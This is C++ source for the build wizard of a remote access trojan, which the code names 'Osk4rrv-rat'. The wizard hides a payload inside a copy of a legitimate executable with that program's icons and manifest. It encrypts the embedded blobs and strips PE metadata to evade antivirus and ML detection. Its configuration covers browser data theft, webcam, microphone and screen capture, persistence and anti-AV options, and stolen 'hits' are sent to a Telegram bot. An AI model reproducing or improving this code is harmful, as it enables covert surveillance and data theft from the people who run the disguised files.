// debug.log showed "Build clicked" but never "performBuild done", with no
// handled-error line either. A hard crash skips destructors, so the only way to
// localise it is to flush a marker before each heavy stage. These lines are
// cheap (one open/append/close) and tell us exactly which stage dies.
#define BUILD_STAGE(msg) do { dbgLog("  [stage] %s", msg); } while (0)
#define BUILD_PROGRESS(n) do { g_buildStage.store(n); } while (0)

// ---------------------------------------------------------------------------
// Asynchronous build
// ---------------------------------------------------------------------------
// Why the build no longer runs inline:
//
// performBuild() used to be called directly from inside the ImGui render loop,
// on the render thread, between NewFrame() and Render(). It is a long
// synchronous job: read the original (tens of MB), run blzCompress over it,
// UpdateResource the blobs, then allocate a second copy of the whole output for
// the PE patch. For a small original (a few hundred KB) that finishes inside a
// frame and nobody notices. For an 87 MB original the process spikes to several
// hundred MB of transient allocations while the D3D11 swap chain and ImGui's
// vertex buffers are mid-frame — which is what produced the silent crash
// (no exception, no destructor, no log line).
//
// Running it on a worker thread keeps the render loop responsive and moves the
// big allocations off the frame path. The UI polls `g_buildRunning` and reads
// the status string under a mutex.
static std::thread         g_buildThread;
static std::atomic<bool>   g_buildRunning{ false };
static std::atomic<bool>   g_buildDone{ false };
static std::atomic<int>    g_buildStage{ 0 };
static std::mutex          g_buildMutex;

// Human-readable stage names, indexed by g_buildStage.
static const char* const kBuildStageNames[] = {
    "Starting...",
    "Reading input files",
    "Writing stub",
    "Embedding resources",
    "Patching PE header",
    "Finished",
};

static void performBuild();

static void startBuildAsync() {
    if (g_buildRunning.load())
        return; // already building

    if (g_buildThread.joinable())
        g_buildThread.join(); // reap the previous run

    g_buildRunning.store(true);
    g_buildDone.store(false);
    g_buildStage.store(0);
    buildStatusMsg[0] = '\0';

    g_buildThread = std::thread([] {
        // Everything performBuild touches (UI buffers, selectedExePath, ...) is
        // read-only for the duration of the build, and the UI blocks the Build
        // button while g_buildRunning is set, so this is safe without a lock.
        g_buildStage.store(1);
        performBuild();
        g_buildStage.store(5);
        g_buildDone.store(true);
        g_buildRunning.store(false);
    });
}

static void performBuild() {
    buildStatusMsg[0] = 0;
    // Safety net: if we somehow leave without a message, the UI must still say something.
    struct BuildMsgGuard {
        ~BuildMsgGuard() {
            if (buildStatusMsg[0] == '\0')
                snprintf(buildStatusMsg, sizeof(buildStatusMsg),
                    "Build did not complete (unknown error). Check debug.log.");
        }
    } buildMsgGuard;

    std::string buildsDir = getBuildsDir();

    char exePath[MAX_PATH];
    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
    std::string exeStr(exePath);
    size_t lastSlash = exeStr.rfind('\\');
    std::string exeDir = (lastSlash != std::string::npos) ? exeStr.substr(0, lastSlash) : ".";
    std::string payloadPath = exeDir + "\\payload.exe";
    std::string binderPath = exeDir + "\\binder.exe";

    if (strlen(botTokenBuf) == 0 || strlen(chatIdBuf) == 0) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
            "Telegram not configured.\nSet Bot Token + Chat ID in Telegram tab, then Build again.");
        return;
    }
    if (!pathFileExists(payloadPath) || !pathFileExists(binderPath)) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
            "Missing payload.exe or binder.exe next to builder:\n%s", exeDir.c_str());
        return;
    }
    if (strlen(selectedExePath) == 0 || !pathFileExists(selectedExePath)) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
            "Select a valid original .exe first (Browse).");
        return;
    }

    if (micDurationSec < 1) micDurationSec = 1;
    if (micDurationSec > 600) micDurationSec = 600;
    if (webcamDurationSec < 1) webcamDurationSec = 1;
    if (webcamDurationSec > 600) webcamDurationSec = 600;
    if (screenDurationSec < 1) screenDurationSec = 1;
    if (screenDurationSec > 600) screenDurationSec = 600;

    std::string baseName = "build";
    if (strlen(selectedExeName) > 0) {
        baseName = selectedExeName;
        size_t dotPos = baseName.rfind('.');
        if (dotPos != std::string::npos)
            baseName = baseName.substr(0, dotPos);
    }
    // sanitize base name for filesystem
    for (char& c : baseName) {
        if (c == '<' || c == '>' || c == ':' || c == '"' || c == '/' || c == '\\' || c == '|' || c == '?' || c == '*')
            c = '_';
    }
    if (baseName.empty())
        baseName = "build";

    std::string destExe = buildsDir + "\\" + baseName + "-" + sessionId + ".exe";
    std::string destConfig = buildsDir + "\\" + baseName + "-" + sessionId + ".ini";
    std::string stubPath = buildsDir + "\\" + baseName + "-" + sessionId + ".stub.exe";

    std::ofstream cfgFile(destConfig);
    if (cfgFile.is_open()) {
        cfgFile << "bot_token=" << botTokenBuf << "\n";
        cfgFile << "chat_id=" << chatIdBuf << "\n";
        cfgFile << "session_id=" << sessionId << "\n";
        cfgFile << "update_interval=" << updateIntervalDays << "\n";
        cfgFile << "opt_grab_browser=" << (buildOptions[0] ? 1 : 0) << "\n";
        cfgFile << "opt_screenshot=" << (buildOptions[1] ? 1 : 0) << "\n";
        cfgFile << "opt_autostart=" << (buildOptions[2] ? 1 : 0) << "\n";
        cfgFile << "opt_grab_webcam=" << (buildOptions[3] ? 1 : 0) << "\n";
        cfgFile << "opt_grab_microphone=" << (buildOptions[4] ? 1 : 0) << "\n";
        cfgFile << "opt_bypass_vt=" << (buildOptions[5] ? 1 : 0) << "\n";
        cfgFile << "opt_stealth=" << (buildOptions[6] ? 1 : 0) << "\n";
        cfgFile << "opt_persistence=" << (buildOptions[7] ? 1 : 0) << "\n";
        cfgFile << "opt_anti_debug=" << (buildOptions[8] ? 1 : 0) << "\n";
        cfgFile << "opt_encrypt_traffic=" << (buildOptions[9] ? 1 : 0) << "\n";
        cfgFile << "opt_anti_av=" << (buildOptions[10] ? 1 : 0) << "\n";
        cfgFile << "mic_duration_sec=" << micDurationSec << "\n";
        cfgFile << "webcam_duration_sec=" << webcamDurationSec << "\n";
        cfgFile << "screen_duration_sec=" << screenDurationSec << "\n";
        // Archive password: 0 = payload generates a random one per hit,
        // 1 = use archive_password verbatim (empty value means NO password).
        cfgFile << "opt_custom_password=" << (useCustomPassword ? 1 : 0) << "\n";
        cfgFile << "archive_password=" << customPasswordBuf << "\n";
        // keep original name so binder/payload can report it
        cfgFile << "original_name=" << selectedExeName << "\n";
        cfgFile.close();
    }

    // Read blobs first so we fail early with clear sizes
    BUILD_STAGE("read blobs start");
    std::vector<char> binderData = readFileBytes(binderPath);
    std::vector<char> payloadData = readFileBytes(payloadPath);
    std::vector<char> originalData = readFileBytes(selectedExePath);
    std::vector<char> configData = readFileBytes(destConfig);
    dbgLog("  [stage] read blobs done: binder=%zu payload=%zu original=%zu config=%zu",
        binderData.size(), payloadData.size(), originalData.size(), configData.size());

    if (binderData.empty() || payloadData.empty() || originalData.empty()) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg),
            "Failed to read files.\nbinder=%zu payload=%zu original=%zu\norig path: %s",
            binderData.size(), payloadData.size(), originalData.size(), selectedExePath);
        return;
    }

    // Embed data as PE resources (no overlay) to avoid binder/dropper detection.
    // Write binder stub to destExe, then use UpdateResource to embed icons + encrypted blobs.
    BUILD_STAGE("write stub");
    BUILD_PROGRESS(2);
    if (!writeFileBytes(destExe, binderData)) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg), "Failed to write stub: %s", destExe.c_str());
        return;
    }

    // Generate 32-byte XOR key from multiple entropy sources
    BYTE xorKey[32];
    DWORD tick = GetTickCount();
    LARGE_INTEGER perf;
    QueryPerformanceCounter(&perf);
    SYSTEMTIME st;
    GetSystemTime(&st);
    for (int i = 0; i < 32; i++) {
        xorKey[i] = (BYTE)((tick >> (i % 24)) ^ (perf.QuadPart >> (i % 56)) ^
            (st.wMilliseconds * (i + 1)) ^ (0xA7 + i * 7));
        if (xorKey[i] == 0) xorKey[i] = 0xA7 ^ (i + 1);
    }

    // NOTE: the blobs are NOT XOR'd here. Compression + encryption both happen
    // inside embedCompressed() below, in that order (compress, then XOR), which
    // is the reverse of what the binder does at runtime (XOR, then decompress).

    // Open destExe for resource update
    BUILD_STAGE("BeginUpdateResource");
    HANDLE hUpdate = BeginUpdateResourceA(destExe.c_str(), FALSE);
    if (!hUpdate) {
        snprintf(buildStatusMsg, sizeof(buildStatusMsg), "BeginUpdateResource failed: err=%lu", GetLastError());
        return;
    }

    // Copy icons from original EXE
    BUILD_STAGE("copy icons from original");
    HMODULE hSrc = LoadLibraryExA(selectedExePath, nullptr, LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE);
    if (hSrc) {
        IconCopyCtx ctx{ hSrc, hUpdate, true };
        EnumResourceNamesW(hSrc, RT_ICON, enumIconRes, (LONG_PTR)&ctx);
        EnumResourceNamesW(hSrc, RT_GROUP_ICON, enumIconRes, (LONG_PTR)&ctx);
        EnumResourceNamesW(hSrc, RT_VERSION, enumIconRes, (LONG_PTR)&ctx);
        FreeLibrary(hSrc);
    }
    BUILD_STAGE("copy icons done");

    // === UAC: make the final file inherit the ORIGINAL's privilege level ===
    // The stub (binder.exe) ships asInvoker. We transplant the original file's
    // RT_MANIFEST so the output requests exactly the same privileges as the file
    // the user selected — no admin shield unless the original had one.
    //
    // Before deleting anything we enumerate the exact (id, language) triples the
    // stub really carries. A resource is keyed by (type, name, language): deleting
    // a triple that is not present returns ERROR_INVALID_PARAMETER (87) and
    // invalidates the whole update transaction — that was the
    // "Failed to embed resources" bug (binder.exe stores its manifest at
    // language 0x0409, while the old code tried to delete it at 0x0000).
    std::vector<ManifestKey> stubManifestKeys;
    if (HMODULE hStubMod = LoadLibraryExA(destExe.c_str(), nullptr,
            LOAD_LIBRARY_AS_DATAFILE | LOAD_LIBRARY_AS_IMAGE_RESOURCE)) {
        stubManifestKeys = listManifestKeys(hStubMod);
        FreeLibrary(hStubMod);
    }
    BUILD_STAGE("manifest transplant start");
    bool manifestOk = transplantManifestsInto(hUpdate, selectedExePath, stubManifestKeys);
    dbgLog("  [stage] manifest transplant done ok=%d keys=%zu", (int)manifestOk, stubManifestKeys.size());

    // Embed encrypted blobs as RCDATA resources.
    //
    // Each blob is LZ-compressed BEFORE being XOR-encrypted. PE files compress to
    // roughly 55-62%, and the payload is the largest thing in the output, so this
    // is what keeps the built exe from being needlessly huge. The binder unwraps
    // the same two layers in reverse (XOR, then decompress).
    //
    // The XOR mask is NOT optional: the binder descrambles every blob it loads
    // (101/102/103) unconditionally and only then tests for "MZ". A blob that
    // skipped the mask comes back scrambled, fails that test, and makes the stub
    // `return 1` before launching anything — i.e. the built exe silently does
    // nothing. So the uncompressed path below has to encrypt too. Resource 104
    // (the key itself) and 200 (ffmpeg) stay plaintext on purpose.
    auto embedRes = [&](WORD id, const void* data, DWORD size) -> bool {
        return UpdateResourceW(hUpdate, RT_RCDATA, MAKEINTRESOURCEW(id),
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), (void*)data, size) != 0;
    };

    auto embedEncrypted = [&](WORD id, std::vector<char>& blob) -> bool {
        // Tiny blobs (config.ini is a few hundred bytes) can come out LARGER
        // after LZ framing, so only compress when there is a real win to be had.
        const size_t kMinCompress = 4096;

        // blzCompress allocates a chain table proportional to the input
        // (4 bytes per input byte) plus a bound-sized output buffer. On a large
        // blob (tens of MB) that is a several-hundred-MB spike. Refuse to run it
        // above a safe ceiling and fall back to a raw embed instead — a raw
        // 87 MB write is far cheaper than the compressor's working set.
        const size_t kMaxCompressInput = 32u * 1024u * 1024u; // 32 MB

        size_t cLen = 0;
        BYTE* c = nullptr;
        if (blob.size() >= kMinCompress && blob.size() <= kMaxCompressInput) {
            dbgLog("  [stage] compress id=%u size=%zu", id, blob.size());
            c = blzCompress((const BYTE*)blob.data(), blob.size(), &cLen);
            dbgLog("  [stage] compress id=%u done -> %zu", id, cLen);
            // Only keep the compressed form if it actually saved something.
            if (c && cLen + 64 >= blob.size()) { free(c); c = nullptr; }
        } else if (blob.size() > kMaxCompressInput) {
            dbgLog("  [stage] id=%u too large to compress (%zu), raw embed", id, blob.size());
        }

        if (c) {
            for (size_t i = 0; i < cLen; i++) c[i] ^= xorKey[i % 32];
            bool ok = embedRes(id, c, (DWORD)cLen);
            free(c);
            return ok;
        }

        // Raw embed: mask in place, write, then restore so `blob` stays usable
        // for the size report at the end of the build. XOR is its own inverse,
        // so the second pass is an exact undo (and costs no extra allocation —
        // the original can be ~90 MB, which we do not want to copy).
        for (size_t i = 0; i < blob.size(); i++)
            blob[i] = (char)(blob[i] ^ xorKey[i % 32]);
        bool ok = embedRes(id, blob.data(), (DWORD)blob.size());
        for (size_t i = 0; i < blob.size(); i++)
            blob[i] = (char)(blob[i] ^ xorKey[i % 32]);
        return ok;
    };

    bool resOk = manifestOk;
    BUILD_STAGE("embed 101 (original)");
    BUILD_PROGRESS(3);
    if (!embedEncrypted(101, originalData)) resOk = false;
    BUILD_STAGE("embed 101 done");
    BUILD_STAGE("embed 102 (payload)");
    if (!embedEncrypted(102, payloadData)) resOk = false;
    BUILD_STAGE("embed 102 done");
    if (!configData.empty()) {
        // config.ini is small enough that compression never pays off — but it
        // still has to be XOR-encrypted, because the binder decrypts resource
        // 103 before dropping it next to the payload as config.ini/payload.ini.
        // Embedding it plaintext made the payload parse a scrambled file, find
        // no bot_token/chat_id, and silently send nothing.
        if (!embedEncrypted(103, configData)) resOk = false;
    }
    if (!embedRes(104, xorKey, 32)) resOk = false;

    // Bundle ffmpeg.exe (if the builder ships one) as an UNENCRYPTED resource.
    // The payload extracts it at runtime so screen/webcam recording works on
    // machines that have no ffmpeg installed. Unencrypted on purpose: the loader
    // must be able to run it directly after dropping.
    {
        std::string ffCandidates[] = {
            exeDir + "\\ffmpeg.exe",
            exeDir + "\\bin\\ffmpeg.exe",
            exeDir + "\\..\\ffmpeg.exe",
        };
        for (const std::string& ff : ffCandidates) {
            if (!pathFileExists(ff)) continue;
            std::vector<char> ffData = readFileBytes(ff);
            if (ffData.size() < 100000) continue; // sanity: real ffmpeg is multi-MB
            if (!embedRes(200, ffData.data(), (DWORD)ffData.size())) resOk = false;
            break;
        }
    }

    BUILD_STAGE("EndUpdateResource");
    BOOL endOk = EndUpdateResourceA(hUpdate, FALSE);
    dbgLog("  [stage] EndUpdateResource done ok=%d resOk=%d", (int)endOk, (int)resOk);

    if (!endOk || !resOk) {
        DeleteFileA(destExe.c_str());
        snprintf(buildStatusMsg, sizeof(buildStatusMsg), "Failed to embed resources in: %s", destExe.c_str());
        return;
    }

    // Clean up temp stub file if it exists
    DeleteFileA(stubPath.c_str());

    // Strip Rich header + zero debug data directory to reduce ML fingerprinting
    BUILD_STAGE("PE patch start");
    BUILD_PROGRESS(4);
    {
        HANDLE hFile = CreateFileA(destExe.c_str(), GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD lo, hi;
            lo = GetFileSize(hFile, &hi);
            if (lo > 0x400 && lo < 100 * 1024 * 1024) {
                std::vector<BYTE> peData(lo);
                DWORD read = 0;
                ReadFile(hFile, peData.data(), lo, &read, nullptr);
                if (read == lo && peData.size() >= 0x80 && peData[0] == 'M' && peData[1] == 'Z') {
                    DWORD e_lfanew = *(DWORD*)(peData.data() + 0x3C);
                    if (e_lfanew + 0x100 < peData.size() && *(DWORD*)(peData.data() + e_lfanew) == 0x00004550) {
                        // Zero the Rich header (between DOS stub and PE header)
                        DWORD richStart = 0x80;
                        DWORD richEnd = e_lfanew;
                        for (DWORD i = richStart; i < richEnd; i++)
                            peData[i] = 0;

                        // Zero debug data directory entry (offset 0xA8 for 64-bit, 0x98 for 32-bit)
                        WORD machine = *(WORD*)(peData.data() + e_lfanew + 4);
                        DWORD optHdrOff = e_lfanew + 24;
                        WORD optMagic = *(WORD*)(peData.data() + optHdrOff);
                        DWORD dataDirOff = optHdrOff + (optMagic == 0x20b ? 112 : 96); // PE32+ vs PE32
                        DWORD numDataDirs = *(DWORD*)(peData.data() + optHdrOff + (optMagic == 0x20b ? 108 : 92));
                        // Debug directory is index 6
                        if (numDataDirs > 6 && dataDirOff + 6 * 8 + 8 <= peData.size()) {
                            DWORD* dbgDir = (DWORD*)(peData.data() + dataDirOff + 6 * 8);
                            dbgDir[0] = 0; // RVA
                            dbgDir[1] = 0; // Size
                        }

                        // Randomize TimeDateStamp in COFF header
                        DWORD randStamp = GetTickCount() ^ (DWORD)0x5A5A5A5A ^ (e_lfanew * 31);
                        *(DWORD*)(peData.data() + e_lfanew + 8) = randStamp;

                        SetFilePointer(hFile, 0, nullptr, FILE_BEGIN);
                        DWORD written = 0;
                        WriteFile(hFile, peData.data(), lo, &written, nullptr);
                    }
                }
            }
            CloseHandle(hFile);
        }
    }
    BUILD_STAGE("PE patch done");

    LARGE_INTEGER finalSize = {};
    HANDLE hCheck = CreateFileA(destExe.c_str(), GENERIC_READ, FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (hCheck != INVALID_HANDLE_VALUE) {
        GetFileSizeEx(hCheck, &finalSize);
        CloseHandle(hCheck);
    }

    snprintf(buildStatusMsg, sizeof(buildStatusMsg),
        "Build OK: %s\nsize=%lld bytes\noriginal=%zu | payload=%zu | config=%zu\nname: %s",
        destExe.c_str(),
        finalSize.QuadPart,
        originalData.size(),
        payloadData.size(),
        configData.size(),
        selectedExeName[0] ? selectedExeName : "(none)");

    ShellExecuteA(g_hwnd, "open", buildsDir.c_str(), nullptr, nullptr, SW_SHOWNORMAL);
}


static void sendTestHit() {
    std::string password = generateRandomCode(8);

    // Timestamp in the "(time, date)" shape the payload uses.
    std::string timestamp;
    {
        std::time_t now = std::time(nullptr);
        std::tm lt;
        localtime_s(&lt, &now);
        char buf[40];
        std::strftime(buf, sizeof(buf), "%H:%M, %d-%m-%Y", &lt);
        timestamp = buf;
    }

    // Unique suffix so repeated tests never reuse an archive name.
    char suffix[32];
    snprintf(suffix, sizeof(suffix), "%u%05u",
        (unsigned)GetTickCount() % 100000u, (unsigned)(rand() % 100000));

    std::string archiveName = "hit-" + sessionId + "-" + suffix + ".rar";

    // Mirrors the payload's buildHitMessage() layout exactly, with the machine
    // fields marked as test data since the builder has no target to inspect.
    std::string msg;
    msg += "Osk4rrv-rat V1.1\n";
    msg += "New hit on sessionid: " + sessionId + "!\n";
    msg += "\n";
    msg += "Quick info:\n";
    msg += "File opened: test.exe\n";
    msg += "PC Name: (test)\n";
    msg += "IP: (test)\n";
    msg += "Geolocation: (test)\n";
    msg += "CPU: (test)\n";
    msg += "GPU: (test)\n";
    msg += "OS: (test)\n";
    msg += "Password for archive: " + password + "\n";
    msg += "\n";
    msg += "Download archive by clicking attachment.\n";
    msg += "(" + timestamp + ")";

    // Minimal but valid RAR signature so the attachment is a real file.
    static const char rarSignature[] = { 0x52, 0x61, 0x72, 0x21, 0x1A, 0x07, 0x01, 0x00 };
    std::vector<char> rarData(rarSignature, rarSignature + sizeof(rarSignature));

    lastTestMessage = msg;
    telegram.sendDocumentAsync(msg, archiveName, rarData);
}

static void closeBuildWizard(bool goHome) {
    showBuildPopup = false;
    buildWizardStep = 0;
    buildWizardStepFrom = 0;
    buildWizardStepAnim = 1.0f;
    if (goHome)
        currentTab = 0; // overview
    buildStatusMsg[0] = '\0';
}

static void dbgLog(const char* fmt, ...) {
    char buf[1024];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);

    std::string path;
    char appdata[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(nullptr, CSIDL_APPDATA, nullptr, 0, appdata))) {
        std::string dir = std::string(appdata) + "\\AppDataCfg";
        CreateDirectoryA(dir.c_str(), nullptr); // may already exist
        path = dir + "\\debug.log";
    } else {
        path = "debug.log";
    }

    FILE* f = fopen(path.c_str(), "a");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%02d:%02d:%02d] %s\n", st.wHour, st.wMinute, st.wSecond, buf);
        fclose(f);
    }
}

static void goBuildWizardStep(int step) {
    if (step == buildWizardStep)
        return;
    buildWizardStepFrom = buildWizardStep;
    buildWizardStep = step;
    buildWizardStepAnim = 0.0f;
}

// Full-window builder (like splash): flat content, no card/modal.
static void iconText(const char* icon, const char* label) {
    if (fontIcons) {
        ImGui::PushFont(fontIcons, fontIcons->LegacySize);
        ImGui::TextUnformatted(icon);
        ImGui::PopFont();
        ImGui::SameLine(0.0f, 8.0f);
    }
    ImGui::TextUnformatted(label);
}

static void drawBuildPopup() {
    if (!showBuildPopup && buildWizardAnim < 0.001f)
        return;

    const float dt = ImGui::GetIO().DeltaTime;
    const float animTarget = showBuildPopup ? 1.0f : 0.0f;
    const float animStep = 1.0f - std::exp(-11.0f * dt);
    buildWizardAnim += (animTarget - buildWizardAnim) * animStep;
    if (!showBuildPopup && buildWizardAnim < 0.01f) {
        buildWizardAnim = 0.0f;
        buildWizardStep = 0;
        buildWizardStepAnim = 1.0f;
        buildWizardStepFrom = 0;
        return;
    }
    if (showBuildPopup && buildWizardAnim > 0.999f)
        buildWizardAnim = 1.0f;

    buildWizardStepAnim += (1.0f - buildWizardStepAnim) * (1.0f - std::exp(-14.0f * dt));
    if (buildWizardStepAnim > 0.999f)
        buildWizardStepAnim = 1.0f;

    const float openEase = 1.0f - (1.0f - buildWizardAnim) * (1.0f - buildWizardAnim) * (1.0f - buildWizardAnim);
    const float stepEase = 1.0f - (1.0f - buildWizardStepAnim) * (1.0f - buildWizardStepAnim);

    const ImVec2 winSize = ImGui::GetWindowSize();
    const ImVec2 p0 = ImGui::GetWindowPos();
    ImDrawList* dl = ImGui::GetWindowDrawList();

    dl->AddRectFilled(p0, ImVec2(p0.x + winSize.x, p0.y + winSize.y), Ui::color(Ui::Canvas), kWindowRounding);

    // Drag only top strip (not chrome buttons)
    handleWindowDrag(p0, ImVec2(winSize.x - 88.0f, 48.0f));

    const float stepDir = (buildWizardStep >= buildWizardStepFrom) ? 1.0f : -1.0f;
    const float stepSlide = (1.0f - stepEase) * 20.0f * stepDir;
    const float fadeInY = (1.0f - openEase) * 12.0f;

    const float padL = 28.0f + stepSlide;
    const float padR = 28.0f;
    const float topY = 22.0f + fadeInY;
    const float footerH = 64.0f;
    const float contentW = winSize.x - padL - padR;

    const float contentAlpha = (openEase < 0.2f) ? 0.2f : openEase;
    const float stepAlpha = (stepEase < 0.25f) ? 0.25f : stepEase;
    ImGui::PushStyleVar(ImGuiStyleVar_Alpha, contentAlpha * stepAlpha);

    // ================= SUCCESS =================
    if (buildWizardStep == 2) {
        const char* title = "Success";
        const char* sub = "Your build is ready.";
        ImFont* big = fontHeading ? fontHeading : ImGui::GetFont();
        float titleSz = big->LegacySize + 6.0f;
        ImVec2 titleMs = big->CalcTextSizeA(titleSz, FLT_MAX, 0.0f, title);
        ImFont* body = fontBody ? fontBody : ImGui::GetFont();
        float bodySz = body->LegacySize;
        ImVec2 subMs = body->CalcTextSizeA(bodySz, FLT_MAX, 0.0f, sub);

        // centered icon + text block
        float blockH = 56.0f + titleMs.y + 10.0f + subMs.y;
        float blockY = p0.y + (winSize.y - blockH - footerH) * 0.5f;

        if (fontIcons) {
            ImGui::PushFont(fontIcons, 42.0f);
            ImVec2 iconMs = fontIcons->CalcTextSizeA(42.0f, FLT_MAX, 0.0f, ICON_FA_CIRCLE_CHECK);
            dl->AddText(
                fontIcons,
                42.0f,
                ImVec2(p0.x + (winSize.x - iconMs.x) * 0.5f, blockY),
                Ui::color(Ui::Success),
                ICON_FA_CIRCLE_CHECK);
            ImGui::PopFont();
            blockY += 56.0f;
        }

        dl->AddText(
            big,
            titleSz,
            ImVec2(p0.x + (winSize.x - titleMs.x) * 0.5f, blockY),
            Ui::color(Ui::TextPrimary),
            title);
        blockY += titleMs.y + 10.0f;
        dl->AddText(
            body,
            bodySz,
            ImVec2(p0.x + (winSize.x - subMs.x) * 0.5f, blockY),
            Ui::color(Ui::TextMuted),
            sub);

        // Continue centered bottom
        const float contW = 140.0f;
        const float btnH = 38.0f;
        ImGui::SetCursorPos(ImVec2((winSize.x - contW) * 0.5f, winSize.y - footerH + 10.0f));
        char contLabel[64];
        snprintf(contLabel, sizeof(contLabel), "%s  Continue", ICON_FA_ARROW_RIGHT);
        if (styledButton(contLabel, ImVec2(contW, btnH), true))
            closeBuildWizard(false);
    }
    // ================= STEP 0 / 1 =================
    else {
        // Title top-left
        ImGui::SetCursorPos(ImVec2(padL, topY));
        if (fontHeading) ImGui::PushFont(fontHeading, fontHeading->LegacySize);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
        if (buildWizardStep == 0)
            iconText(ICON_FA_FILE, "Select an .exe file");
        else
            iconText(ICON_FA_SLIDERS, "Build options");
        ImGui::PopStyleColor();
        if (fontHeading) ImGui::PopFont();

        ImGui::SetCursorPosX(padL);
        ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
        ImGui::TextUnformatted(
            buildWizardStep == 0
                ? "Choose the original executable to package."
                : "Pick features, capture durations and update interval.");
        ImGui::PopStyleColor();

        // body: mid-left content
        const float bodyTop = 96.0f + fadeInY;
        const float bodyH = winSize.y - bodyTop - footerH - 8.0f;
        ImGui::SetCursorPos(ImVec2(padL, bodyTop));
        ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(0, 0, 0, 0));
        ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(0.0f, 0.0f));
        ImGui::BeginChild(
            "##build_wizard_body",
            ImVec2(contentW, bodyH > 80.0f ? bodyH : 80.0f),
            ImGuiChildFlags_None,
            ImGuiWindowFlags_AlwaysVerticalScrollbar);
        ImGui::PopStyleVar();
        ImGui::PopStyleColor();

        // --- Build progress (while the worker thread is running) ---
        // The build now runs off the render thread, so this is the only signal
        // that a long build is still alive rather than hung.
        if (g_buildRunning.load() && buildWizardStep != 2) {
            const int stage = g_buildStage.load();
            const int stageCount = (int)(sizeof(kBuildStageNames) / sizeof(kBuildStageNames[0]));
            const char* name = (stage >= 0 && stage < stageCount)
                ? kBuildStageNames[stage] : "Working...";

            ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(Ui::Accent.x, Ui::Accent.y, Ui::Accent.z, 0.10f));
            ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(Ui::Accent.x, Ui::Accent.y, Ui::Accent.z, 0.55f));
            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(14.0f, 10.0f));
            if (ImGui::BeginChild("##build_progress_banner",
                    ImVec2(0.0f, 0.0f), ImGuiChildFlags_Borders | ImGuiChildFlags_AutoResizeY,
                    ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
                ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
                ImGui::Text("Building - %s", name);
                ImGui::PopStyleColor();
                // Fraction shown as text plus ImGui's own indeterminate-ish bar.
                const float frac = (stageCount > 1)
                    ? (float)stage / (float)(stageCount - 1) : 0.0f;
                ImGui::PushStyleColor(ImGuiCol_PlotHistogram, Ui::Accent);
                ImGui::ProgressBar(frac, ImVec2(-FLT_MIN, 6.0f), "");
                ImGui::PopStyleColor();
            }
            ImGui::EndChild();
            ImGui::PopStyleVar(2);
            ImGui::PopStyleColor(2);
            ImGui::Dummy(ImVec2(0.0f, 6.0f));
        }

        // --- Build result / error feedback (TOP, always visible) ---
        // performBuild() writes into buildStatusMsg. Rendering this FIRST guarantees
        // the wizard never looks like it "does nothing" on failure or missing input.
        if (buildStatusMsg[0] != '\0' && buildWizardStep != 2) {
            const bool ok = strstr(buildStatusMsg, "Build OK") != nullptr;
            const ImVec4 accent = ok ? Ui::Success : Ui::Danger;

            ImGui::PushStyleColor(ImGuiCol_ChildBg, ImVec4(accent.x, accent.y, accent.z, 0.10f));
            ImGui::PushStyleColor(ImGuiCol_Border, ImVec4(accent.x, accent.y, accent.z, 0.55f));
            ImGui::PushStyleVar(ImGuiStyleVar_ChildRounding, 8.0f);
            ImGui::PushStyleVar(ImGuiStyleVar_WindowPadding, ImVec2(14.0f, 10.0f));
            if (ImGui::BeginChild("##build_result_banner",
                    ImVec2(0.0f, 0.0f), ImGuiChildFlags_Borders | ImGuiChildFlags_AutoResizeY,
                    ImGuiWindowFlags_NoScrollbar | ImGuiWindowFlags_NoScrollWithMouse)) {
                if (fontIcons) {
                    ImGui::PushFont(fontIcons, fontIcons->LegacySize);
                    ImGui::PushStyleColor(ImGuiCol_Text, accent);
                    ImGui::TextUnformatted(ok ? ICON_FA_CIRCLE_CHECK : ICON_FA_TRIANGLE_EXCLAMATION);
                    ImGui::PopStyleColor();
                    ImGui::PopFont();
                    ImGui::SameLine(0.0f, 8.0f);
                }
                ImGui::PushStyleColor(ImGuiCol_Text, accent);
                ImGui::PushTextWrapPos(ImGui::GetWindowContentRegionMax().x);
                ImGui::TextWrapped("%s", buildStatusMsg);
                ImGui::PopTextWrapPos();
                ImGui::PopStyleColor();
            }
            ImGui::EndChild();
            ImGui::PopStyleVar(2);
            ImGui::PopStyleColor(2);

            ImGui::Dummy(ImVec2(0.0f, 14.0f));
        }

        if (buildWizardStep == 0) {
            if (fontMedium) ImGui::PushFont(fontMedium, fontMedium->LegacySize);
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextPrimary);
            iconText(ICON_FA_FOLDER_OPEN, "Original executable");
            ImGui::PopStyleColor();
            if (fontMedium) ImGui::PopFont();

            ImGui::Dummy(ImVec2(0.0f, 4.0f));
            ImGui::PushStyleColor(ImGuiCol_Text, Ui::TextMuted);
            ImGui::TextWrapped("This file is required. The payload will be packaged into a copy of it.");
            ImGui::PopStyleColor();
            ImGui::Dummy(ImVec2(0.0f, 16.0f));

            {
                const float browseW = 120.0f;
                const float gap = 10.0f;
                // keep controls left-aligned, not full-window stretch
